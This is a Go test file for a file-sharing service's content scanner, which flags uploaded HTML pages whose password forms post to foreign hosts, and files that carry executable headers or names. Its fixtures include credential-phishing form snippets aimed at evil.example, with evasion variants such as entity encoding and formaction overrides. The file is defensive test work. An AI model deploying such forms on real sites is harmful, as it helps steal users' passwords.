package sharing

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"io"
	"net/url"
	"reflect"
	"sort"
	"strings"
	"testing"

	"github.com/mrRedSun/redrop/internal/config"
	"github.com/mrRedSun/redrop/internal/store"
)

const ownHost = "amber-otter-quilt-river.usercontent.example"

func TestCredentialForm(t *testing.T) {
	flagged := map[string]string{
		"absolute action":        `<form action="https://evil.example/login"><input type="password"></form>`,
		"protocol-relative":      `<form action="//evil.example/x"><input type=password name=p></form>`,
		"http":                   `<form method=post action="http://evil.example"><input type="PassWord"></form>`,
		"backslashes":            `<form action="https:\\evil.example\x"><input type="password"></form>`,
		"formaction on a button": `<form action="/ok"><input type="password"><button formaction="https://evil.example/">Go</button></form>`,
		"formaction on an input": `<form><input type="password"><input type="submit" formaction="//evil.example"></form>`,
		"unclosed form":          `<form action="https://evil.example"><input type="password">`,
		"second form":            `<form action="/a"><input type="password"></form><form action="https://evil.example/b"><input type=password>`,
		"uppercase tags":         `<FORM ACTION="https://EVIL.example."><INPUT TYPE="password"></FORM>`,
		"entity-encoded":         `<form action="https&#58;//evil.example/"><input type="password"></form>`,
		"self-closing input":     `<form action="https://evil.example"><input type="password"/></form>`,
	}
	for name, doc := range flagged {
		if got := credentialForm(strings.NewReader(doc), ownHost); got != "evil.example" {
			t.Errorf("%s: %q, want evil.example", name, got)
		}
	}
	clean := map[string]string{
		"relative action":        `<form action="/login"><input type="password"></form>`,
		"no action":              `<form><input type="password"></form>`,
		"own host":               `<form action="https://` + ownHost + `/x"><input type="password"></form>`,
		"no password":            `<form action="https://evil.example/search"><input name="q"></form>`,
		"password outside forms": `<input type="password"><form action="https://evil.example"></form>`,
		"password after close":   `<form action="https://evil.example"></form><input type="password">`,
		"mailto":                 `<form action="mailto:a@evil.example"><input type="password"></form>`,
		"javascript":             `<form action="javascript:send()"><input type="password"></form>`,
		"in a script":            `<script>document.write('<form action="https://evil.example"><input type="password"></form>')</script>`,
		"in a comment":           `<!-- <form action="https://evil.example"><input type="password"></form> -->`,
		"in a textarea":          `<textarea><form action="https://evil.example"><input type="password"></form></textarea>`,
		"duplicate attribute":    `<form action="/ok" action="https://evil.example"><input type="password"></form>`,
		"not html":               "MZ\x90\x00binary\x00<<<>>>",
	}
	for name, doc := range clean {
		if got := credentialForm(strings.NewReader(doc), ownHost); got != "" {
			t.Errorf("%s: flagged %q", name, got)
		}
	}
}

func pe() []byte {
	b := make([]byte, 0x80)
	copy(b, "MZ")
	binary.LittleEndian.PutUint32(b[0x3c:], 0x40)
	copy(b[0x40:], "PE\x00\x00")
	return b
}

func TestExecutableMagic(t *testing.T) {
	be := func(v uint32, rest ...byte) []byte { return append(binary.BigEndian.AppendUint32(nil, v), rest...) }
	flagged := map[string][]byte{
		"PE":                pe(),
		"ELF":               []byte("\x7fELF\x02\x01\x01"),
		"Mach-O 64":         be(0xfeedfacf),
		"Mach-O 32 swapped": be(0xcefaedfe),
		"Mach-O 64 swapped": be(0xcffaedfe),
		"universal":         be(0xcafebabe, 0, 0, 0, 2),
	}
	for name, b := range flagged {
		if executableMagic(b) == "" {
			t.Errorf("%s not recognized", name)
		}
	}
	dosOnly := pe()
	copy(dosOnly[0x40:], "XX")
	far := pe()
	binary.LittleEndian.PutUint32(far[0x3c:], 0xfffffff0)
	clean := map[string][]byte{
		"text starting with MZ": []byte("MZ is a postcode area in this list of places, 64 bytes or more, so the header check runs."),
		"MZ without PE":         dosOnly,
		"PE offset outside":     far,
		"short MZ":              []byte("MZ"),
		"Java class":            be(0xcafebabe, 0, 0, 0, 52),
		"PNG":                   []byte("\x89PNG\r\n\x1a\n"),
		"empty":                 nil,
		"HTML":                  []byte("<!doctype html>"),
	}
	for name, b := range clean {
		if got := executableMagic(b); got != "" {
			t.Errorf("%s flagged as %q", name, got)
		}
	}
	for _, name := range []string{"setup.EXE", "a/b/app.apk", "x.msi", "run.bat", "Tool.AppImage"} {
		if executableName(name) == "" {
			t.Errorf("%s not flagged by name", name)
		}
	}
	for _, name := range []string{"index.html", "app.js", "exe", "notes.exe.txt", "run.sh", "a.zip"} {
		if executableName(name) != "" {
			t.Errorf("%s flagged by name", name)
		}
	}
}

type blobs map[string][]byte

func (b blobs) open(sum string) (io.ReadCloser, error) {
	v, ok := b[sum]
	if !ok {
		return nil, errors.New("missing blob")
	}
	return io.NopCloser(bytes.NewReader(v)), nil
}

func file(path, blob string, b blobs, ct string) store.File {
	return store.File{Path: path, Blob: blob, Size: int64(len(b[blob])), ContentType: ct}
}

func kinds(found []finding) []string {
	var out []string
	for _, f := range found {
		out = append(out, f.kind+" "+f.category+" "+f.detail)
	}
	sort.Strings(out)
	return out
}

func TestScanFiles(t *testing.T) {
	ctx := context.Background()
	b := blobs{
		"page":  []byte(`<form action="https://evil.example/"><input type="password"></form>`),
		"plain": []byte("<p>hello</p>"),
		"pe":    pe(),
	}
	files := []store.File{
		file("index.html", "plain", b, "text/html; charset=utf-8"),
		file("login.html", "page", b, "text/html; charset=utf-8"),
		file("again.htm", "page", b, "application/octet-stream"),
		file("bin/tool", "pe", b, "application/octet-stream"),
		file("second.exe", "plain", b, "application/octet-stream"),
	}
	found, complete := scanFiles(ctx, files, ownHost, b.open)
	want := []string{
		"executable malware bin/tool: Windows executable (PE)",
		"form phishing login.html: a password form posts to evil.example",
	}
	if !complete || !reflect.DeepEqual(kinds(found), want) {
		t.Fatalf("found %v (complete %v), want %v", kinds(found), complete, want)
	}
	// Only HTML is parsed for forms: the same bytes in a .txt file are not.
	if found, _ := scanFiles(ctx, []store.File{file("notes.txt", "page", b, "text/plain")}, ownHost, b.open); len(found) != 0 {
		t.Fatalf("text file flagged: %v", kinds(found))
	}
	// Untrusted names are cleaned and shortened.
	long := strings.Repeat("a", 300) + "\u202e\n.exe"
	found, _ = scanFiles(ctx, []store.File{file(long, "plain", b, "")}, ownHost, b.open)
	if len(found) != 1 || len([]rune(strings.SplitN(found[0].detail, ": ", 2)[0])) != maxFindingPath+1 || strings.ContainsAny(found[0].detail, "\n\u202e") {
		t.Fatalf("long name: %q", found[0].detail)
	}
}

func TestScanFilesBounds(t *testing.T) {
	b := blobs{"big": append([]byte(`<p>`+strings.Repeat("x", 4096)+`</p>`), []byte(`<form action="https://evil.example/"><input type="password"></form>`)...)}
	files := []store.File{file("index.html", "big", b, "text/html")}

	// The per-file HTML limit: a form after it is not seen.
	defer func(v int64) { scanHTMLBytes = v }(scanHTMLBytes)
	scanHTMLBytes = 1024
	if found, complete := scanFiles(context.Background(), files, ownHost, b.open); len(found) != 0 || !complete {
		t.Fatalf("past the per-file limit: %v %v", kinds(found), complete)
	}
	scanHTMLBytes = 1 << 20

	// The total budget: spent, the scan stops and says so.
	defer func(v int64) { scanTotalBytes = v }(scanTotalBytes)
	scanTotalBytes = 100
	many := []store.File{file("a.html", "big", b, "text/html"), file("b.html", "big", b, "text/html")}
	if _, complete := scanFiles(context.Background(), many, ownHost, b.open); complete {
		t.Fatal("budget spent, scan reported complete")
	}
	scanTotalBytes = 32 << 20

	// The deadline.
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if found, complete := scanFiles(ctx, files, ownHost, b.open); complete || len(found) != 0 {
		t.Fatalf("cancelled scan: %v %v", kinds(found), complete)
	}
	// An unreadable blob ends the scan without a finding or a panic.
	if found, complete := scanFiles(context.Background(), []store.File{{Path: "x.html", Blob: "gone", Size: 10, ContentType: "text/html"}}, ownHost, b.open); complete || len(found) != 0 {
		t.Fatalf("missing blob: %v %v", kinds(found), complete)
	}
}

func TestReportedLink(t *testing.T) {
	content, _ := url.Parse("https://usercontent.example")
	s := &Service{cfg: &config.Config{ContentURL: content}}
	good := map[string][2]string{
		"https://amber-otter-quilt-river.usercontent.example/":               {"amber-otter-quilt-river", "https://amber-otter-quilt-river.usercontent.example/"},
		" https://Amber-Otter-Quilt-River.UserContent.example./p?q=1#frag ":  {"amber-otter-quilt-river", "https://amber-otter-quilt-river.usercontent.example/p?q=1"},
		"http://amber-otter-quilt-river.usercontent.example:8443/x":          {"amber-otter-quilt-river", "http://amber-otter-quilt-river.usercontent.example:8443/x"},
		"https://abcdefghijklmnopqrstuvwxyz.usercontent.example/legacy.html": {"abcdefghijklmnopqrstuvwxyz", "https://abcdefghijklmnopqrstuvwxyz.usercontent.example/legacy.html"},
	}
	for raw, want := range good {
		slug, link, err := s.reportedLink(raw)
		if err != nil || slug != want[0] || link != want[1] {
			t.Errorf("%q: %q %q %v, want %v", raw, slug, link, err, want)
		}
	}
	for _, raw := range []string{"", "usercontent.example", "https://usercontent.example/", "ftp://amber-otter-quilt-river.usercontent.example/",
		"https://amber-otter-quilt-river.usercontent.example.evil.example/", "https://x.amber-otter-quilt-river.usercontent.example/",
		"https://user@amber-otter-quilt-river.usercontent.example/", "https://bad_slug.usercontent.example/",
		"https://amber-otter-quilt-river.usercontent.example/" + strings.Repeat("a", 2048), "//amber-otter-quilt-river.usercontent.example/"} {
		if _, _, err := s.reportedLink(raw); err == nil {
			t.Errorf("%q accepted", raw)
		}
	}
}

// TestAdminReportFields pins the queue's result. ReportedURL is the one
// link it carries: the one a reporter submitted (DESIGN.md "Admin queue").
func TestAdminReportFields(t *testing.T) {
	var names []string
	typ := reflect.TypeOf(AdminReport{})
	for i := 0; i < typ.NumField(); i++ {
		names = append(names, typ.Field(i).Name)
	}
	sort.Strings(names)
	want := []string{"Artifact", "ArtifactID", "Category", "ClosedAt", "ClosedBy", "Contact", "CreatedAt", "Details", "History", "ID", "OwnerSuspended",
		"OwnerUsername", "ReportedURL", "Source", "Status", "Version"}
	if !reflect.DeepEqual(names, want) {
		t.Fatalf("AdminReport fields changed:\n got %v\nwant %v", names, want)
	}
	if f, _ := typ.FieldByName("Artifact"); f.Type != reflect.TypeOf(&AdminArtifact{}) {
		t.Fatalf("Artifact is %v, want *AdminArtifact (no link)", f.Type)
	}
}
